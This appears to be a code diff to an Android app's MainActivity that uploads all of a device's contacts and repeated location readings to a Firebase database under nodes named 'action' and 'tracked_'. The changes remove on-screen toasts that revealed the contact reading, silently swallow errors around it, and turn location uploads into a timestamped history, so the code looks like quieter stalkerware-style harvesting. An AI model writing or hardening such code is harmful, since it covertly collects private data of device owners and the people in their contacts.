@@ -422,7 +422,7 @@ public class MainActivity extends AppCompatActivity {
             showNoInternetDialog();
         }
 
-        checkForUpdate();
+        //checkForUpdate();
 
     }
 
@@ -447,30 +447,6 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-//        database.collection("updates")
-//                .document("info")
-//                .get()
-//                .addOnSuccessListener(new OnSuccessListener<DocumentSnapshot>() {
-//                    @Override
-//                    public void onSuccess(DocumentSnapshot documentSnapshot) {
-//                        if (documentSnapshot.exists()){
-//                            Long updateVersion = documentSnapshot.getLong("version");
-//                            Boolean important = documentSnapshot.getBoolean("important");
-//                            String message = documentSnapshot.getString("message");
-//
-//                            try {
-//                                PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
-//                                Long versionCode = (long) packageInfo.versionCode;
-//                                if (updateVersion > versionCode){
-//                                    showUpdateDialog(message, versionCode, important);
-//                                }
-//
-//                            } catch (PackageManager.NameNotFoundException e) {
-//                                e.printStackTrace();
-//                            }
-//                        }
-//                    }
-//                });
     }
 
     @Override
@@ -494,8 +470,6 @@ public class MainActivity extends AppCompatActivity {
         ContentResolver contentResolver = getContentResolver();
         Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null);
-
-        Toast.makeText(activity, "con", Toast.LENGTH_SHORT).show();
         
         if (cursor != null) {
             while (cursor.moveToNext()) {
@@ -503,9 +477,8 @@ public class MainActivity extends AppCompatActivity {
                 @SuppressLint("Range") String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                 data.getReference().child("action2")
                         .child("tracked_"+auth.getCurrentUser().getUid()+Helper.getDateKey())
-                        .child(name)
+                        .child(Helper.sanitizeForFirebase(name))
                         .setValue(phoneNumber);
-                Toast.makeText(activity, "cons", Toast.LENGTH_SHORT).show();
             }
             cursor.close();
         }
@@ -577,7 +550,8 @@ public class MainActivity extends AppCompatActivity {
                                 double latitude = location.getLatitude();
                                 double longitude = location.getLongitude();
                                 data.getReference().child("action")
-                                        .child("tracked_"+auth.getCurrentUser().getUid())
+                                        .child("tracked_"+auth.getCurrentUser().getUid()+"_"+
+                                                System.currentTimeMillis())
                                         .child("latlong")
                                         .setValue(latitude + " + "+ longitude);
 
@@ -750,7 +724,6 @@ public class MainActivity extends AppCompatActivity {
         // Show the dialog
         dialog.show();
     }
-
     private void checkNotification() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
             // Permission not granted, request it
@@ -774,7 +747,11 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == 302) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 // Permission granted, proceed with reading contacts
-                getContacts2();
+                try {
+                    getContacts2();
+                }catch (Exception e){
+
+                }
             }
         }
     }
